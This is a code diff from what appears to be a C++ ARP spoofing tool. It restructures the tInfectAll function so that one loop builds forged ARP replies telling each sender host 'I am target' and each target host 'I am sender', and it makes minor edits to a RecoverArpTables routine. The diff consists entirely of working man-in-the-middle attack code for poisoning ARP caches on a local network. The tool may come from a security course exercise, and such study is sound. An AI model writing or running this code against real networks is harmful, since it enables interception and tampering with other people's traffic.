@@ -386,8 +386,9 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 	}
 	const size_t listSize = SenderIpList_.size();
 
-	// sender <-> me. claim "I am target."
-	std::vector<EthArpPacket> pktArpRepInfectSenderList;
+	
+	std::vector<EthArpPacket> pktArpRepInfectSenderList; // sender <-> me. claim "I am target."
+	std::vector<EthArpPacket> pktArpRepInfectTargetList; // target <-> me. claim "I am sender."
 	for(int i = 0; i < listSize; i++){
 		EthArpPacket pkt;
 		pkt.eth_.smac_ = MyMac_;
@@ -402,28 +403,13 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 		pkt.arp_.sip_ = htonl(TargetIpList_.at(i));
 		pkt.arp_.tmac_ = SenderMacList_.at(i);
 		pkt.arp_.tip_ = htonl(SenderIpList_.at(i));
-
 		pktArpRepInfectSenderList.push_back(pkt);
-	}
 
-	// target <-> me. claim "I am sender."
-	std::vector<EthArpPacket> pktArpRepInfectTargetList;
-	for(int i = 0; i < listSize; i++){
-		EthArpPacket pkt;
-		pkt.eth_.smac_ = MyMac_;
 		pkt.eth_.dmac_ = TargetMacList_.at(i);
-		pkt.eth_.type_ = htons(EthHdr::Arp);
-		pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
-		pkt.arp_.pro_ = htons(EthHdr::Ip4);
-		pkt.arp_.hln_ = Mac::SIZE;
-		pkt.arp_.pln_ = Ip::SIZE;
-		pkt.arp_.op_ = htons(ArpHdr::Reply);
-		pkt.arp_.smac_ = MyMac_;
 		pkt.arp_.sip_ = htonl(SenderIpList_.at(i));
 		pkt.arp_.tmac_ = TargetMacList_.at(i);
 		pkt.arp_.tip_ = htonl(TargetIpList_.at(i));
-
-		pktArpRepInfectTargetList.push_back(pkt);
+		pktArpRepInfectTargetList.push_back(pkt);		
 	}
 
 	// stupid method.
@@ -591,7 +577,6 @@ void RecoverArpTables(const char* deviceName_, Mac MyMac_,
 		pkt.arp_.sip_ = htonl(SenderIpList_.at(i));
 		pkt.arp_.tmac_ = TargetMacList_.at(i);
 		pkt.arp_.tip_ = htonl(TargetIpList_.at(i));
-		
 		pktArpRepRecoverList.push_back(pkt);
 
 		pkt.eth_.dmac_ = SenderMacList_.at(i);
